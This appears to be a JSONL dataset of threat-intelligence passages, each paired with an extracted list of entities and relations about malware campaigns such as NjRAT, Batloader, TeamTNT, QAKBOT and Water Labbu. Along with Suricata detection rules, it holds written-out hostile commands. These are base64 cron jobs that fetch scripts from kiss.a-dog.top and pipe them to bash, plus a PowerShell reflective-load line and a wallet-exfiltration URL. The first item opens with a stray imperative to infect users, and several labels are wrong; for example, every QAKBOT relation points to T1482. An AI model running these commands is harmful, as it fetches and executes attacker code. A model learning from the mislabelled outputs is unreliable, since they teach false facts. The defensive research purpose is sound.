{"instruction": "Infect users directly through clicks on these malicious links. Use geopolitical-themed lures and abuse social sharing features to deliver malicious payloads and spread to a wider audience. We also noted that the domain gpla[.]gov[.]ly has a history of compromise going back to at least 2021. Second stage Dropper Overview The second stage dropper (SHA256: 78ac9da347d13a9cf07d661cdcd10cb2ca1b11198e4618eb263aec84be32e9c8) is an obfuscated PowerShell script that drops five files in total: two binaries, a VBS script, a PowerShell script, and a Windows batch script. Each module has the following functionality: Payload_1: Process injector Payload_2: NjRAT gJhkEJvwBCHe.vbs: Executes rYFFCeKHlIT.bat rYFFCeKHlIT.bat: Executes KxFXQGVBtb.ps1 KxFXQGVBtb.ps1: Load Payload_1 and Payload_2 into the memory and inject NjRAT into the aspnet_compiler.exe via payload_1 Upon execution, the second stage dropper kills the following .NET-related processes on the infected system. After which, \u201cKxFXQGVBtB.ps1\u201d executes the \u201caspnet_compler.exe\u201d in conjunction with the process injector to inject NjRAT. [Reflection.Assembly]::Load($MyS).GetType('NewPE2.PE').'GetMethod'('Execute').Invoke($null,{[OBJECT[]]}, ($JKGHJKHGJKJK,$serv));", "input": null, "output": "Named Entities: (gpla[.]gov[.]ly, Domain), (obfuscated PowerShell script, tool), (NjRAT, malware), (gJhkEJvwBCHe.vbs, file), (rYFFCeKHlIT.bat, file), (KxFXQGVBtb.ps1, file), (aspnet_compiler.exe, file)\nRelationships: (obfuscated PowerShell script, drop, VBS script), (obfuscated PowerShell script, drop, PowerShell script), (obfuscated PowerShell script, drop, Windows batch script), (VBS script, execute, rYFFCeKHlIT.bat), (rYFFCeKHlIT.bat, execute, KxFXQGVBtb.ps1), (KxFXQGVBtb.ps1, inject, NjRAT)"}
{"instruction": "After a few days of analyzing this Batloader campaign, we have observed that the malicious actors behind it have obfuscated the JavaScript files as an additional detection evasion measure. Based on the distribution domains used in this campaign, we believe that this campaign was launched during Black Friday: logmeinofferblackfriday[.]com anydeskofferblackfriday[.]com zoomofferblackfriday[.]com slackcloudservices[.]com anydeskofferblackfriday[.]com According to our telemetry, a significant number of campaigns used this technique between the end of November to the first week of December 2022. Use of PyArmor tool to obfuscate Batloader Python script After the JavaScript campaigns of Batloader, we observed since the second week of December 2022 that the group abused the Advanced Installer Software again. This time the malicious file that it executed in the end is a Python script protected with PyArmor.", "input": null, "output": "Named Entities: (Batloader, malware), (logmeinofferblackfriday[.]com, Domain), (anydeskofferblackfriday[.]com, Domain), (zoomofferblackfriday[.]com, Domain), (slackcloudservices[.]com, Domain), (PyArmor, tool)\nRelationships: (logmeinofferblackfriday[.]com, used in, Batloader), (anydeskofferblackfriday[.]com, used in, Batloader), (zoomofferblackfriday[.]com, used in, Batloader), (slackcloudservices[.]com, used in, Batloader), (Batloader, use, PyArmor), (Python script, protected with, PyArmor)"}
{"instruction": "We started observing an increase in Water Minyades activity in September 2022, which was also the time when we started seeing Batloader deploying Royal ransomware to its victims. The number of attacks peaked from November until the first week of December 2022. The C&C domain with the most number of requests for Q4 2022 is \u201cinstallationupgrade6[.]com.\u201d Interestingly, this was the first C&C domain used in the Batloader campaign via JavaScript droppers and Black Friday Sale-related malicious distribution websites. This could mean that victims are more likely to fall for malvertising campaigns that promote sales or discounts. This highlights the massive impact social engineering lures have on the success of these malicious campaigns. Conclusion", "input": null, "output": "Named Entities: (Water Minyades, attacker), (Batloader, malware), (Royal ransomware, threat type), (installationupgrade6[.]com, Domain)\nRelationships: (Water Minyades, deploy, Batloader), (Batloader, deploy, Royal ransomware), (Batloader, use, installationupgrade6[.]com)"}
{"instruction": "The goal for the first stage is to download and execute the payload for the second stage. The second stage is a refactored code with functions similar to the malware discussed in this report. It also collects various machine information, along with loading additional modules from URLs listed here: <C&C>:<port>/down/case/log.bsh <C&C>:<port>/down/keeper/WindowsPlayer <C&C>:<port>/down/keeper/midlrtmd <C&C>:<port>/down/keeper/log.bsh As of this writing, the server was no longer accessible, so no payload was served. We traced the C&C server to static-files[.]livelyhellp[.]chat:888. After observing that the malicious actor\u2019s use of the file name log.bsh was unique, we tried to find out more about it. Our search led us to backdoors written in Golang language, suggesting a possible link to the LiveHelp100 campaign.", "input": null, "output": "Named Entities: (second stage, malware), (C&C server, tool), (log.bsh, file), (static-files[.]livelyhellp[.]chat:888, Domain)\nRelationships: (C&C server, trace to, static-files[.]livelyhellp[.]chat:888), (log.bsh, link to, LiveHelp100 campaign)"}
{"instruction": "We also discovered a more recent active chain, deployed between Oct. 8 and 12, 2022. We observed that victims infected with the trojanized LiveHelp100 application were instructed to download and execute the following files from delivery server s[.]livelyhellp[.]chat: hxxp[:]//<C&C>:<port>/sugrec hxxp[:]//<C&C>:<port>/load.action/FixU hxxp[:]//<C&C>:<port>/load.action/html.xml hxxp[:]//<C&C>:<port>/load.action/kdump64 This new chain starts with three files: first, a legitimate and signed rcmdhelper.exe with DLL-sideloading vulnerability, and then kdump64.dll, which is the decryptor and loader, and lastly, html.xml, which contains the encrypted payload for the first stage of the executable backdoor. First stage Malicious actors use this stage as a downloader of the next stage using sockets. The C&C server name is encrypted by simply adding a constant value to each byte of the server\u2019s name. The communication to the C&C server in this case is unencrypted and only contains the command number, 0x09, to download the second stage.", "input": null, "output": "Named Entities: (trojanized LiveHelp100 application, malware), (s[.]livelyhellp[.]chat, Domain), (rcmdhelper.exe, file), (kdump64.dll, file), (html.xml, file), (executable backdoor, malware), (C&C server, tool)\nRelationships: (trojanized LiveHelp100 application, instructed to download and execute, s[.]livelyhellp[.]chat), (s[.]livelyhellp[.]chat, seen in, trojanized LiveHelp100 application), (s[.]livelyhellp[.]chat, seen in, executable backdoor), (executable backdoor, starts with, rcmdhelper.exe), (executable backdoor, contains, kdump64.dll), (executable backdoor, contains, html.xml), (kdump64.dll, decryptor and loader, executable backdoor), (html.xml, payload, executable backdoor)"}
{"instruction": "The C&C server and the port had the following value, hard-coded and encrypted in the second-stage executable binary: files[.]amazonawsgarages[.]com:888. The update packet received from the C&C server contains the update file name 7.zip, downloaded from /down/update/ directory. This file path was used so that the payload can be saved to C:\\Users\\Public\\Folder.zip. The packet contains an update file that indicates where it is to be downloaded from and where it will be saved. After downloading, the contents of the archive are extracted and saved as a file, with the information also contained in the packet. The name of the file to be executed is saved to C:\\Users\\Public\\Folder\\RcmdHelper.exe. The packet starts with its length, DWORD 0x384, followed by internal command ID, update = DWORD 0x3ef, followed by the command data itself. Update", "input": null, "output": "Named Entities: (files[.]amazonawsgarages[.]com, Domain), (7.zip, file), (C:\\Users\\Public\\Folder.zip, file), (C:\\Users\\Public\\Folder\\RcmdHelper.exe, file)\nRelationships: No related relations."}
{"instruction": "Recently, we came across an exploitation attempt leveraging monitoring and visualization tool Weave Scope to enumerate the Amazon Web Services (AWS) instance metadata service (IMDS) from Elastic Compute Cloud (EC2) instances through environment variables and the IMDS endpoint. The abuse of this tool can allow the exfiltration of access keys and tokens to a domain possibly owned by the attacker and uses a dated technique called typosquatting on AWS-owned domain amazonaws.com. This is followed by the use of masscan and zgrab to find Weave Scope user interface (UI) instances and the exfiltration of IP addresses and ports found. We advise users to strengthen, reinforce, and customize their respective cloud security policies, developer-centric tools, and measures to mitigate the impact of compromise from threats and attacks. Execution flow", "input": null, "output": "Named Entities: (Weave Scope, tool), (Amazon Web Services, tool), (EC2 instances, tool), (amazonaws.com, Domain), (masscan, tool), (zgrab, tool)\nRelationships: No related relations."}
{"instruction": "Once the credentials have been gathered, they are combined into one hidden file named \u201c.aws\u201d, separated by two new lines, while the original files are removed. Later, the environment variables of each process are searched for via \u201cAWS\u201d or \u201cEC2\u201d, and appended to the file \u201c.aws\u201d with two new lines added. Once the file at <$HOME/\u2026aws> is ready with all the credentials collected, the file is exfiltrated to the domain \u201camazon2aws.com\u201d via curl and then removed. getrange and rangescan This function takes in an argument, RANGE, which is later passed on to another function called rangescan. This second function uses zgrab to scan the IP addresses in RANGE for accessible Weave Scope UI on ports 80, 443, and 4040, the default ports used by Weave Scope UI.", "input": null, "output": "Named Entities: (amazon2aws.com, Domain), (curl, tool), (zgrab, tool)\nRelationships: No related relations."}
{"instruction": "Our observations showed there is no value supplied to getrange. Rather it fetches the IP addresses from ipranges.txt, which contains Classless Inter-Domain Routing (CIDRs) that are to be scanned for Weave Scope UI instances. Network enumeration tools like masscan and zgrab are used to find the IP addresses and UI instances. When accessible instances of Weave Scope UI are found, the corresponding IP address and port are exfiltrated using curl to the attacker-controlled server amazon2aws.com. Domain transferred", "input": null, "output": "Named Entities: (ipranges.txt, file), (Weave Scope UI, tool), (masscan, tool), (zgrab, tool), (amazon2aws.com, Domain)\nRelationships: No related relations."}
{"instruction": "Analyzing the attacker-controlled server, we came across a complaint raised by Amazon Technologies, Inc., a research and development subsidiary of Amazon.com, Inc., against the registrant Nice IT Services Group Inc./Customer Domain Admin, the former owner of the malicious typosquat domain. Uniform Domain Name Dispute Resolution Policy (UDRP) is a legal framework for the resolution of domain name disputes among registrants. Reviewing the decision of the administrative panel, we noted that the domain was later transferred to Amazon Technologies, Inc. in June 2022 in the \u201cFindings\u201d section: Checking with VirusTotal for the IP addresses used to resolve the domain, we observed that the documented history of amazon2aws[.]com and teamtnt[.]red may be related to the threat actor group TeamTNT. Conclusion", "input": null, "output": "Named Entities: (VirusTotal, tool), (amazon2aws[.]com, Domain), (teamtnt[.]red, Domain)\nRelationships: No related relations."}
{"instruction": "Once the attacker gained access to the domain controller via remote desktop protocol (RDP) using the compromised account of the domain administrator, the ransomware samples were dropped on the server and a malicious group policy containing a malicious scheduled task was created on Sep 9, 2022 to execute ransomware from the shared folder hosted on the Domain Controller server. The domain controller server was used by the attackers to create a malicious group policy object (GPO) on Sep 9, 2022. The GPO then created a malicious scheduled task that ran the malicious batch files \u201c1.bat\u201d and \u201cinstall.bat\u201d to deploy the ransomware on the rest of the machines that are connected to the domain controller. The batch file \u201cinstall.bat\u201d was used to disable the security agent services found on the targeted machines. After deploying the ransomware, the attacker deleted the scripts folder that contained the malicious file samples.", "input": null, "output": "Named Entities: (attacker, attacker), (domain controller, tool), (ransomware, threat type), (malicious group policy object (GPO), tool)\nRelationships: (attacker, gained access to, domain controller), (attacker, deleted, scripts folder)"}
{"instruction": "c. Adds the following cron job instruction into a .dat file: i. */2 * * * * root echo Y2QxIGh0dHA6Ly9raXNzLmEtZG9nLnRvcC9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash Base64 decoded string: cd1 http[:]//kiss.a-dog.top/b2f628/b.sh ii. */3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash Base64 decoded string: wget -q -O- http[:]//kiss.a-dog.top/b2f628/b.sh iii. */4 * * * * root echo Y3VybCBodHRwOi8va2lzcy5hLWRvZy50b3AvYjJmNjI4L2Iuc2gK|base64 -d|bash|bash Base64 decoded string: curl http[:]//kiss.a-dog.top/b2f628/b.sh iv. c2V0IGJhY2t1cDQgIlxuXG5cbkBob3VybHkgcm9vdCAgcHl0aG9uIC1jIFwiaW1wb3J0IHVybGxpYjI7IHByaW50IHVybGxpYjIudXJsb3BlbihcJ2h0dHA6Ly9raVxcc1xccy5hLWRcXG9nLnRcXG9ccC90LnNoXCcpLnJlYWQoKVwiID4uMTtjaG1vZCAreCAuMTsuLy4xXG5cbiIK Base64 decoded string: set backup4 \"\\n\\n\\n@hourly root python -c \\\"import urllib2; print urllib2.urlopen(\\'http[:]//ki\\\\s\\\\s.a-d\\\\og.t\\\\o\\p/t.sh\\').read()\\\" >.1;chmod +x .1;./.1\\n\\n\" While scanning with the tools (masscan and pnscan) for the available Redis server in the network, it reads the .dat file and sends the instruction from the file to the Redis server to add cron jobs to download these shell scripts.", "input": null, "output": "Named Entities: (kiss.a-dog.top, Domain), (b2f628/b.sh, file), (masscan, tool), (pnscan, tool), (Redis server, tool)\nRelationships: (Redis server, adds cron jobs, shell scripts), (masscan, scans for, Redis server), (pnscan, scans for, Redis server)"}
{"instruction": "This attack uses tactics, techniques, and procedures (TTPs) consistent with those of TeamTNT\u2019s, such as the banner and the use of the identified utilities. However, TeamTNT\u2019s behavior is well-known by now, and this does not conclusively identify the group as the threat actor responsible for this sample. Currently, one of the domains used, oracle[.]zzhreceive[.]top, is linked with the cryptocurrency mining group WatchDog, which has been documented utilizing the same domain as TeamTNT. Researchers have also previously observed that \u201cs3f815\u201d and \u201cb2f628\u201d have been used in the directory name convention found in URLs, and the \u201c1.0.4.tar.gz\u201d label used in the file names used by this group.", "input": null, "output": "Named Entities: (TeamTNT, attacker), (oracle[.]zzhreceive[.]top, Domain), (WatchDog, attacker), (1.0.4.tar.gz, file)\nRelationships: (TeamTNT, use, oracle[.]zzhreceive[.]top), (oracle[.]zzhreceive[.]top, linked with, WatchDog)"}
{"instruction": "QAKBOT drops Brute Ratel Five minutes after the automated reconnaissance activities are completed, the QAKBOT-injected wermgr.exe process drops the Brute Ratel DLL and invokes it via a rundll32.exe child process with the \u201cmain\u201d export function. The backdoor is a HTTPS , which performs a check-in with the Brute Ratel Server at symantecuptimehost[.]com: POST hxxps://symantecuptimehost[.]com:8080/admin.php?login= HTTP/1.1 Content-Type: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Host: symantecuptimehost[.]com:8080 Content-Length: 122 Cache-Control: no-cache Further reconnaissance is performed in the environment to identify privileged users. First, the built-in net.exe and nltest.exe are used. Order Process 1 C:\\Windows\\SysWOW64\\net.exe net group \"Domain Admins\" /domain 2 C:\\Windows\\SysWOW64\\net.exe net group \"Domain Controllers\" /domain 3 C:\\Windows\\SysWOW64\\nltest.exe nltest /domain_trusts /all_trusts 4 C:\\Windows\\SysWOW64\\net.exe net user <redacted> /domain Table 3. Reconnaissance processes to identify privileged users", "input": null, "output": "Named Entities: (QAKBOT, malware), (Brute Ratel, malware), (wermgr.exe, file), (rundll32.exe, file), (symantecuptimehost[.]com, Domain), (net.exe, file), (nltest.exe, file)\nRelationships: (QAKBOT, drop, Brute Ratel), (QAKBOT, inject, wermgr.exe), (wermgr.exe, invoke, rundll32.exe), (Brute Ratel, check-in, symantecuptimehost[.]com), (symantecuptimehost[.]com, seen in, QAKBOT)"}
{"instruction": "T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder QAKBOT can maintain persistence by creating an auto-run Registry key TA0004 Privilege Escalation T1055 Process Injection QAKBOT can inject itself into processes like wermgr.exe TA0006 Defense Evasion T1027.006 Obfuscated Files or Information: HTML Smuggling Smuggles a file\u2019s content by hiding malicious payloads inside of seemingly benign HTML files. T1218.010 System Binary Proxy Execution: Regsvr32 QAKBOT can use Regsvr32 to execute malicious DLLs Cobalt Strike can use rundll32.exe to load DLL from the command line T1140. Deobfuscate/Decode Files or Information Initial QAKBOT .zip file bypasses some antivirus detections due to password protections. T1562.009. Impair Defenses: Safe Boot Mode Black Basta uses bcdedit to boot the device in safe mode. TA0007 Discovery T1010 Application Window Discovery QAKBOT can enumerate windows on a compromised host. T1482 Domain Trust Discovery QAKBOT can run nltest /domain_trusts /all_trusts for domain trust discovery.", "input": null, "output": "Named Entities: (T1547.001, technique), (QAKBOT, malware), (TA0004, technique), (T1055, technique), (TA0006, technique), (T1027.006, technique), (T1218.010, technique), (Cobalt Strike, tool), (rundll32.exe, file), (T1140, technique), (T1562.009, technique), (Black Basta, malware), (TA0007, technique), (T1010, technique), (T1482, technique)\nRelationships: (QAKBOT, process injection, T1482), (QAKBOT, evasion, T1482), (QAKBOT, obfuscate files, T1482), (QAKBOT, execute DLLs, T1482), (Cobalt Strike, load DLLs, rundll32.exe), (QAKBOT, deobfuscate files, T1482), (Black Basta, impair defenses, T1482), (QAKBOT, discover windows, T1482), (QAKBOT, discover domain trust, T1482)"}
{"instruction": "In the first part of our Water Labbu blog series, we described how the threat actor used the fraudulent websites of other cryptocurrency scammers to steal cryptocurrency. In our second entry in the Water Labbu series, we would like share how the threat actor leveraged a customer support application to compromise scammers and patched the application using malicious code.\nDuring our investigation, we managed to find a staged Cobalt Strike loader on Virus Total (SHA-256: b81edcbf1a0b56d0f401dcfe4a6ae4d293663b42f120e60579353b6aa86bb105) associated with this threat campaign. According to the sandbox behavior report on Virus Total, the loader launched a Cobalt Strike instance that was instructed to report on the infection progress. The collected information was sent to the server, \u201clinkstometa[.]com,\u201d which, as mentioned in our first blog entry, was for collecting balance information and delivering cryptocurrency hijacking scripts.", "input": null, "output": "Named Entities: (cryptocurrency scammers, threat type), (Cobalt Strike loader, tool), (b81edcbf1a0b56d0f401dcfe4a6ae4d293663b42f120e60579353b6aa86bb105, SHA256), (linkstometa[.]com, Domain)\nRelationships: (customer support application, compromise, scammers), (Cobalt Strike loader, associated with, threat campaign)"}
{"instruction": "During our research, we discovered that many of the links used for loading additional scripts were no longer active. However, one of the links loading a script called \u201capo.js\u201d (\u963f\u5a46 = mother-in-law) from their code repository was still available. If the title contains the Chinese string \u201c\u767b\u5f55\u201d (d\u0113ng l\u00f9 = login), the script will try to grab the value of DOM elements with the IDs \u201cemail\u201d and \u201cpassword\u201d and send the grabbed data to the remote server \u201capp[.]meiqiacontents[.]com\u201d. If the title contains the Chinese word \u201c\u7f8e\u201d (Mei), it will collect the website\u2019s cookies and send them to the same remote server.", "input": null, "output": "Named Entities: (apo.js, file), (app[.]meiqiacontents[.]com, Domain)\nRelationships: (apo.js, load, app[.]meiqiacontents[.]com), (apo.js, send, app[.]meiqiacontents[.]com), (apo.js, send, app[.]meiqiacontents[.]com)"}
{"instruction": "When victims open a new window without specifying any URL to load, the new window will load the default URL of the application (APP_URL), which has also been replaced with a malicious URL hosted on the delivery server \u201cmmmm[.]whg7[.]cc\u201d. The delivery server will only respond when the User-Agent contains the string \u201cElectron\u201d to ensure that it is sent from an Electron application. The request to the malicious URL responds with a code that redirects to the MeiQia app\u2019s original default URL. At the same time, it creates a small new window to load another URL that will perform several redirections before finally attempting to exploit CVE-2021-21220 to launch a Cobalt Strike stager.", "input": null, "output": "Named Entities: (mmmm[.]whg7[.]cc, Domain), (CVE-2021-21220, vulnerability), (Cobalt Strike stager, tool)\nRelationships: No related relations."}
{"instruction": "Credential phishing techniques\nWater Labbu registered the typosquatting domain name meiqla.com (compared to the legitimate meiqia.com). Although the website looks visually identical to the legitimate one, there is one noteworthy malicious feature.\nFigure 14 shows how the function lc() reads the user-entered email and password and exfiltrates them to an information-recording PHP script before redirecting victims to the legitimate meiqia.com website.", "input": null, "output": "Named Entities: (Water Labbu, attacker), (meiqla.com, Domain), (meiqia.com, Domain)\nRelationships: (Water Labbu, register, meiqla.com), (meiqla.com, typosquatting, meiqia.com), (information-recording PHP script, redirect, meiqia.com)"}
{"instruction": "In one of the cases we analyzed, Water Labbu injected an IMG tag to load a Base64- encoded JavaScript payload using the \u201conerror\u201d event, in what is known as an XSS evasion technique, to bypass Cross Site Scripting (XSS) filters. The injected payload then creates another script element that loads another script from the delivery server tmpmeta[.]com. The delivery server then filters victims and delivers different content based on the IP address and the browser User-Agent header (which is used to help determine the victims\u2019 environment). We noticed the following behavior: If the victim loads the script from a mobile device using Android or iOS, it returns the first stage script with cryptocurrency-theft capabilities. If the victim loads the script from a desktop running Windows, it returns another script showing a fake Flash update message asking the victim to download a malicious executable file.", "input": null, "output": "Named Entities: (Water Labbu, malware), (tmpmeta[.]com, Domain)\nRelationships: (script element, load, script from tmpmeta[.]com)"}
{"instruction": "Initially, the web3.js library is loaded. This provides the first stage script the ability to connect to the victim\u2019s wallet, although the malicious script will communicate with the victim\u2019s wallet only if a victim has their wallet connected to the compromised DApp website. Gaining access to the wallet allows Water Labbu to gather the target\u2019s Ethereum address and balance. The script also interacts with Tether USD smart contract to receive the victim\u2019s USDT balance. If the wallet contains more than 0.001 ETH or more than 1 USDT, it will send the wallet balance information and the wallet address to the information collecting server, linkstometa[.]com, via an HTTP request. The following text shows the request to exfiltrate the wallet balance: hxxps[:]//linkstometa[.]com/data/?get&s=[%22{ETH balance}%22,%22{USDT balance}%22]&j={Ethereum address} The cryptocurrency-stealing script: second stage", "input": null, "output": "Named Entities: (web3.js library, tool), (Water Labbu, malware), (Tether USD smart contract, tool), (linkstometa[.]com, Domain)\nRelationships: (web3.js library, loaded by, Water Labbu), (Water Labbu, interact with, Tether USD smart contract)"}
{"instruction": "Analysis of the fake Flash infection chain When a target visits the compromised DApp websites using a Windows desktop, the delivery server, tmpmeta[.]com, will return a different script that will try to steal cookie and LocalStorage data. It also loads additional scripts from other delivery servers such as whg7[.]cc and r8s[.]cc. The delivery server, r8s[.]cc, returned the latest stage script, creating a fake Flash installation message overlay on the compromised websites. The message, which is in simplified Chinese, states that Flash Player support ended on September 14, 2020, and that downloading the latest version is needed to continue viewing the page.", "input": null, "output": "Named Entities: (fake Flash infection chain, threat type), (tmpmeta[.]com, Domain), (whg7[.]cc, Domain), (r8s[.]cc, Domain)\nRelationships: (tmpmeta[.]com, load, script), (tmpmeta[.]com, load, script), (tmpmeta[.]com, load, script), (r8s[.]cc, return, latest stage script)"}
{"instruction": "SUMMARY Note: this joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources. The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known CL0P ransomware IOCs and TTPs identified through FBI investigations as recently as June 2023.", "input": null, "output": "Named Entities: (ransomware, threat type), (CL0P ransomware, malware), (stopransomware.gov, Domain)\nRelationships: No related relations."}
{"instruction": "In one case, FBI observed BianLian actors use a portable executable version of an Impacket tool (secretsdump.py) to move laterally to a domain controller and harvest credential hashes from it. Note: Impacket is a Python toolkit for programmatically constructing and manipulating network protocols. Through the Command Shell, an Impacket user with credentials can run commands on a remote device using the Windows management protocols required to support an enterprise network. Threat actors can run portable executable files on victim systems using local user rights, assuming the executable is not blocked by an application allowlist or antivirus solution. See Appendix: Windows PowerShell and Command Shell Activity for additional information. Persistence and Lateral Movement", "input": null, "output": "Named Entities: (BianLian, attacker), (Impacket tool, tool), (secretsdump.py, file), (domain controller, tool)\nRelationships: (BianLian, use, Impacket tool), (Impacket tool, name, secretsdump.py), (BianLian, move laterally to, domain controller)"}
{"instruction": "BianLian group actors use PsExec and RDP with valid accounts for lateral movement [T1021.001]. Prior to using RDP, BianLian actors used Command Shell and native Windows tools to add user accounts to the local Remote Desktop Users group, modified the added account\u2019s password, and modified Windows firewall rules to allow incoming RDP traffic [T1562.004]. See Appendix: Windows PowerShell and Command Shell Activity for additional information. In one case, FBI found a forensic artifact (exp.exe) on a compromised system that likely exploits the Netlogon vulnerability (CVE-2020-1472) and connects to a domain controller. Collection FBI observed BianLian group actors using malware (system.exe) that enumerates registry [T1012] and files [T1083] and copies clipboard data from users [T1115]. Exfiltration and Impact", "input": null, "output": "Named Entities: (BianLian group actors, attacker), (Windows PowerShell, tool), (Command Shell, tool), (exp.exe, file), (CVE-2020-1472, vulnerability), (domain controller, tool), (system.exe, file)\nRelationships: (BianLian group actors, use, Command Shell), (BianLian group actors, use, Windows PowerShell), (BianLian group actors, modify, Remote Desktop Users group), (exp.exe, connect to, domain controller)"}
{"instruction": "alert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowcsupdates .com)\"; dns_query; content:\"windowcsupdates.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowcsupdates\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;) alert dns $HOME_NET any -> any any (msg:\"ET ATTACK_RESPONSE Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (anydeskupdate .com)\"; dns_query; content:\"anydeskupdate.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)anydeskupdate\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;) alert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (anydeskupdates .com)\"; dns_query; content:\"anydeskupdates.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)anydeskupdates\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)", "input": null, "output": "Named Entities: (windowcsupdates.com, Domain), (anydeskupdate.com, Domain), (anydeskupdates.com, Domain)\nRelationships: No related relations."}
{"instruction": "alert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (updateservicecenter .com)\"; dns_query; content:\"updateservicecenter.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)updateservicecenter\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;) alert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecenter .com)\"; dns_query; content:\"windowservicecenter.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowservicecenter\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;) alert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecentar .com)\"; dns_query; content:\"windowservicecentar.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowservicecentar\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category ATTACK_RESPONSE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;) Note that these signatures may also not work if the actor modified activity to evade detection by known rules. System Monitoring", "input": null, "output": "Named Entities: (updateservicecenter.com, Domain), (windowservicecenter.com, Domain), (windowservicecentar.com, Domain)\nRelationships: No related relations."}
{"instruction": "As early as August 2021, CISA and authoring organizations observed TA2 delivering malicious PNG files that, following analysis, were masqueraded DLL files to avoid detection [T1036.005]. Similar to TA1, TA2 exploited CVE-2019-18935 and was able to upload at least three unique DLL files into the C:\\Windows\\Temp\\ directory that TA2 executed via the w3wp.exe process. These DLL files drop and execute reverse (remote) shell utilities for unencrypted communication with C2 IP addresses associated with the malicious domains listed in Table 3. Note: At the time of analysis, the domains resolved to the listed IP addresses. Table 3: TA2 IPs and Resolving Domains IP Address Resolving Domains 184.168.104[.]171 xework[.]com xegroups[.]com hivnd[.]com 144.96.103[.]245 xework[.]com", "input": null, "output": "Named Entities: (TA2, attacker), (CVE-2019-18935, vulnerability), (reverse shell utilities, tool), (xework[.]com, Domain), (xegroups[.]com, Domain), (hivnd[.]com, Domain)\nRelationships: (TA2, exploit, CVE-2019-18935), (reverse shell utilities, communicate with, C2 IP addresses), (C2 IP addresses, associated with, xework[.]com), (C2 IP addresses, associated with, xegroups[.]com), (C2 IP addresses, associated with, hivnd[.]com)"}
{"instruction": "Analysis of DLL files determined the files listed in Table 4 were dropped, decoded, and attempted to connect to the respective malicious domains. Embedded payloads dropped by the DLL files were observed using the command line utility certutil[.]exe and writing new files as xesvrs[.]exe to invoke reverse shell utilities execution. Table 4: Identified Malicious Files Filename Description XEReverseShell.exe DLL files (masqueraded as PNG files) located in the C:\\Windows\\Temp\\ directory contain a base64 encoded file with the internal name XEReverseShell.exe, which was dropped into the same directory as sortcombat.exe. When executed, the reverse shell utility attempts to connect to xework[.]com or xegroups[.]com to obtain the IP address of the C2 server and port number for unencrypted communication. Note: It is likely the threat actors changed the file extension from .dll to .png to avoid detection. Multi-OS_ReverseShell.exe Reverse shell utility decoded from the base64 encoded file xesmartshell.tmp.", "input": null, "output": "Named Entities: (certutil[.]exe, tool), (xesvrs[.]exe, file), (XEReverseShell.exe, file), (sortcombat.exe, file), (xework[.]com, Domain), (xegroups[.]com, Domain), (Multi-OS_ReverseShell.exe, file), (xesmartshell.tmp, file)\nRelationships: (certutil[.]exe, write, xesvrs[.]exe), (xesvrs[.]exe, invoke, reverse shell utilities), (XEReverseShell.exe, connect to, xework[.]com), (XEReverseShell.exe, connect to, xegroups[.]com), (XEReverseShell.exe, drop, sortcombat.exe), (Multi-OS_ReverseShell.exe, decode from, xesmartshell.tmp)"}
